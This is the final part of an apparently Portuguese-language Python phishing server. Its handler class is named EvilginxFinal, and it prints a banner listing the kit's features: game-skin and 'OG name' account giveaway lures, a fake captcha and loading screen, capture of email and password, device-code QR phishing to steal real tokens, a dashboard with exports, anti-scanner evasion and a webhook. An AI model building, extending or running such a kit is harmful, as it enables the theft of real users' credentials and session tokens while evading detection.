    print(f"📊 Dashboard: {PUBLIC_URL}/dashboard")
    print(f"🎯 QR Code (Device Code): {PUBLIC_URL}/qrcode")
    print("="*70)
    print("✅ Inclui:")
    print("   - Skins / Sorteio de conta OG name (4 letras)")
    print("   - Captcha + Fake Loading")
    print("   - Captura de email e senha")
    print("   - QR Code com Device Code (captura tokens reais sem Azure)")
    print("   - Dashboard e exportações")
    print("   - Anti-Scanner e Webhook")
    print("="*70)
    print("\n🎯 Servidor rodando. Pressione Ctrl+C para parar.\n")
    server = HTTPServer((CONFIG["server_host"], CONFIG["server_port"]), EvilginxFinal)
    server.serve_forever()

if __name__ == "__main__":
    run()